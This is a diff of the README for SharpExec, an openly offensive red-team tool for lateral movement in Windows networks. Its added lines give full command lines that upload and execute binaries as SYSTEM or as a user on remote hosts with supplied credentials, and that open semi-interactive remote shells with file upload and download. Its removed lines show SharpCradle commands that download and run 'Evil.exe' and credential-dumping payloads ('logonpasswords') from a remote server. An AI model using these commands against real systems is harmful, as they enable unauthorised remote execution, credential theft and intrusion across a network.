@@ -3,12 +3,20 @@
 Description
 ============
 
-SharpExec is a tool written in C# and was designed to be another option for penetration testers or red teams to perform lateral movement within a MS Windows environment. It currently includes:
+SharpExec is an offensive security C# tool designed to aid with lateral movement. It currently includes:
 
-PSExec module - Allows you to execute a remote binary with arguments, for example, cmd.exe as NT Authority/System.
-WMI module - Allows you to execute a remote binary with aruguments, for example, cmd.exe as user.
-File upload capability - Allows you to upload a custom file
+-PSExec (like functionality) - Gives the operator the ability to execute remote commands as NT Authority\System or upload a file and execute it with or without arguments as NT Authority\System.
 
+-WMI - Gives the operator the ability to execute remote commands as the user or upload a file and execute it with or without arguments as the user.
+
+-WMIExec - Semi-Interactive shell that runs as the user. Best described as a less mature version of Impacket's wmiexec.py tool.
+
+-SMBExec - Semi-Interactive shell that runs as NT Authority\System.  Best described as a less mature version of Impacket's smbexec.py tool.
+
+In the Future I would like to add:
+
+Lateral movement through DCOM
+Pass the hash functionality
 
 Contact at:
 - Twitter: @anthemtotheego
@@ -37,25 +45,52 @@ Setup - Quick and Dirty
 Examples 
 ========
 
-Web Server Download:
+Note - All modules require Administrative rights on the target systems
+Note - If you the user who runs SharpExec has administrative rights to the target system, username/password/domain options on not required.
 
-```SharpCradle.exe -w https://IP/Evil.exe <arguments to pass>```
+PSExec Module:
 
-```SharpCradle.exe -w https://IP/SharpSploitConsole_x64.exe logonpasswords```
+Uploads file from User1's desktop to C:\ on remote system and executes it as NT Authority\System
 
-File Server Download Anonymous:
+```SharpExec.exe -m=psexec -i=192.168.1.10 -u=TargetUser -p=P@ssword! -d=TargetDomain -f=C:\users\user1\desktop\noPowershell-noargs.exe -e=C:\noPowershell-noargs.exe```
 
-```SharpCradle.exe -f \\IP\share\Evil.exe <arguments to pass>```
+Runs command via cmd.exe on target system as NT Authority\System
 
-```SharpCradle.exe -f \\IP\share\SharpSploitConsole_x64.exe logonpasswords```
+```SharpExec.exe -m=psexec -i=192.168.1.10 -u=TargetUser -p=P@ssword! -d=TargetDomain -e=C:\Windows\System32\cmd.exe -c="My Args"```
 
-File Server Download With Creds:
+WMI Module:
 
-```SharpCradle.exe -f -c domain username password \\IP\share\Evil.exe <arguements to pass>```
+Uploads file from User1's desktop to C:\ on remote system and executes it as TargetUser
 
-```SharpCradle.exe -f -c domain username password \\IP\share\SharpSploitConsole_x64.exe logonpasswords```
+```SharpExec.exe -m=wmi -i=192.168.1.10 -u=TargetUser -p=P@ssword! -d=TargetDomain -f=C:\users\user1\desktop\noPowershell-noargs.exe -e=C:\noPowershell-noargs.exe```
 
-Download .NET inline project file from web:
+Runs command via cmd.exe on target system as TargetUser
 
-```SharpCradle.exe -p https://192.168.1.10/EvilProject.csproj```
+```SharpExec.exe -m=wmi -i=192.168.1.10 -u=TargetUser -p=P@ssword! -d=TargetDomain -e=C:\Windows\System32\cmd.exe -c="My Args"```
+
+WMIExec Module:
+
+Starts semi-interactive shell on remote system as TargetUser
+
+```SharpExec.exe -m=wmiexec -i=192.168.1.10 -u=TargetUser -p=P@ssword! -d=TargetDomain```
+
+While shell is running
+
+```put                  Upload file from local directory to current shell directory, put fullLocalPath\\File.txt File.txt```
+```get                  Download file from current shell directory to local directory, get File.txt fullLocalPath\\File.txt```
+```help                 Show help menu```
+```exit                 exit shell```
+
+SMBExec Module:
+
+Starts semi-interactive shell on remote system as NT Authority\System
+
+```SharpExec.exe -m=smbexec -i=192.168.1.10 -u=TargetUser -p=P@ssword! -d=TargetDomain```
+
+While shell is running
+
+```put                  Upload file from local directory to current shell directory, put fullLocalPath\File.txt fullLocalPath\File.txt```
+```get                  Download file from current shell directory to local directory, get fullLocalPath\File.txt fullLocalPath\File.txt```
+```help                 Show help menu```
+```exit                 exit shell```
 
